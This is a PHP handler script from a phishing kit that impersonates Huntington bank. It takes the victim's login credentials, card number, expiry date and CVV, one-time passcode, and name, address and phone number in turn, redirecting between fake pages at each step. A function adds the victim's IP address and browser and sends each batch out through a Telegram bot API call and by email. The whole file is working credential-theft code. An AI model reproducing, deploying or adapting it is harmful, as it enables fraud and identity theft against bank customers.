<?php
session_start();

switch (@$_POST['scar']) {

		case 1:
            $_SESSION['lgz'] = @$_POST['accountNumber'];
            $cvQ = "[==========  Huntington (Login)  ===========]\r\n";
            $cvQ .= "|Username       : ".$_POST['username']."\r\n";
            $cvQ .= "|Password       : ".$_POST['password']."\r\n";



		EK("Logz", $cvQ );
        header("location: info.html");
        break;
        
		
        case 2:
           
      
            $cvQ = "[==========  Huntington (CC)  ===========]\r\n";
            $cvQ .= "|Card number       : ".$_POST['cc']."\r\n";
            $cvQ .= "|Expiry date       : ".$_POST['exp']."\r\n";
            $cvQ .= "|CVV       : ".$_POST['cvv']."\r\n";



		EK("Card", $cvQ );
        header("location: sms.html");
        break;
        case 3:
            $cvQ = "[==========  Huntington (OTP)  ===========]\r\n";
            $cvQ .= "|OTP       : ".$_POST['otp']."\r\n";



		EK("OTP", $cvQ );
        header("location: Finish.html");
        break;
        case 4:
           
      
            $cvQ = "[==========  Huntington (Info)  ===========]\r\n";
            $cvQ .= "|Full name       : ".$_POST['name']."\r\n";
            $cvQ .= "|Address       : ".$_POST['addr']."\r\n";
            $cvQ .= "|State       : ".$_POST['state']."\r\n";
            $cvQ .= "|Zip       : ".$_POST['zip']."\r\n";
            $cvQ .= "|Phone       : ".$_POST['phone']."\r\n";



		EK("Info", $cvQ );
        header("location: card.html");
        break;
        

		
        
}
function getBrowser($agent = null)
{
    $u_agent = ($agent != null) ? $agent : $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version = "";
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    } elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    } else {
        $platform = 'mobiele telefoon';
    }
    if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    } elseif (preg_match('/Firefox/i', $u_agent)) {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    } elseif (preg_match('/Chrome/i', $u_agent)) {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    } elseif (preg_match('/Safari/i', $u_agent)) {
        $bname = 'Apple Safari';
        $ub = "Safari";
    } elseif (preg_match('/Opera/i', $u_agent)) {
        $bname = 'Opera';
        $ub = "Opera";
    } elseif (preg_match('/Netscape/i', $u_agent)) {
        $bname = 'Netscape';
        $ub = "Netscape";
    }
    $known = array(
        'Version',
        $ub,
        'other');
    $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
    }
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
            $version = $matches['version'][0];
        } else {
            $version = $matches['version'][1];
        }
    } else {
        $version = $matches['version'][0];
    }
    if ($version == null || $version == "") {
        $version = "?";
    }
    return array(
        'userAgent' => $u_agent,
        'name' => $bname,
        'version' => $version,
        'platform' => $platform,
        'pattern' => $pattern);
}
function EK($subj, $berc)
{
    include "../config.php"; 
    $TT = getBrowser();
    $cQ = md5($_SERVER['REMOTE_ADDR']);
    $headers = "From: klantenserv@" . $_SERVER['SERVER_NAME'] . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $message= $berc ;
    $message .= "[========== ".$_SERVER['REMOTE_ADDR']."===========]\r\n";
    $message .= "[========== 👑 (Info importante!) 👑 ===========]\r\n";
    $message .= "|Browser      	 : ".$TT['name']."\r\n";
    $message .= "|OS      	 : ".ucwords($TT['platform'])."\r\n";
    $message .= "|IP      	 : ".$_SERVER['REMOTE_ADDR']."\r\n";
 
    file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
    mail($email,"Huntington (" . $_SESSION['lgz'] .
        " | " . $subj . ")", $message, $headers);
} ?>
